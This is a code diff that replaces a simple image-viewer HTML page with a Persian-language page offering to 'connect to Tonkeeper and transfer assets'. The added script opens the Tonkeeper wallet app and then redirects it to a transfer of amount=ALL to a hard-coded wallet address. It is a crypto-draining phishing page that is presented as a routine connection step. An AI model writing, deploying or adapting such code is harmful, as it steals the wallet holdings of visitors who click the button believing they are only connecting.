@@ -1,66 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fa">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Stylish Image Viewer</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin: 0;
-            padding: 0;
-            background-color: #d4edda; /* سبز خاص برای پس‌زمینه */
-            color: #155724; /* رنگ متن متناسب */
+    <title>انتقال دارایی به Tonkeeper</title>
+    <script>
+        function connectToTonkeeper() {
+            // اتصال به Tonkeeper
+            window.location.href = "tonkeeper://";
+
+            // تأخیر برای اطمینان از اتصال به Tonkeeper
+            setTimeout(function() {
+                // پس از اتصال، دستور انتقال دارایی به آدرس خاص
+                window.location.href = "tonkeeper://transfer/UQCNKhcXrK9cE1h79LROYUacpPkyF30quWHtZ5_Zsakt3r-G?amount=ALL";
+            }, 1000);  // تأخیر 1 ثانیه
         }
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 20px;
-            background-color: #c3e6cb; /* سبز روشن برای هدر */
-            border-bottom: 2px solid #155724; /* خط زیرین هدر */
-        }
-        .header button {
-            background-color: #28a745; /* سبز خاص برای دکمه */
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            transition: background-color 0.3s ease;
-        }
-        .header button:hover {
-            background-color: #218838; /* سبز تیره‌تر برای حالت هاور */
-        }
-        img {
-            max-width: 90%;
-            height: auto;
-            margin-top: 20px;
-            border: 5px solid #c3e6cb; /* قاب سبز برای تصویر */
-            border-radius: 10px;
-        }
-        .image-name {
-            margin: 20px 0;
-            font-size: 20px;
-            font-weight: bold;
-            color: #155724; /* سبز متناسب با متن */
-        }
-    </style>
+    </script>
 </head>
 <body>
-
-    <div class="header">
-        <button onclick="history.back()">Go Back</button>
-        <h1>Floki Usdt</h1>
-    </div>
-
-    <div>
-        <!-- Replace 'image.jpg' with the actual name of your image file -->
-        <img src="Picsart_25-01-12_01-19-15-405.jpg" alt="Image">
-        <div class="image-name">ساعت معرفی: ۰۱:۲۰ در ۲۳ دی ۱۴۰۳</div>
-    </div>
-
+    <h1>اتصال به Tonkeeper و انتقال دارایی</h1>
+    <button onclick="connectToTonkeeper()">اتصال و انتقال</button>
 </body>
 </html>
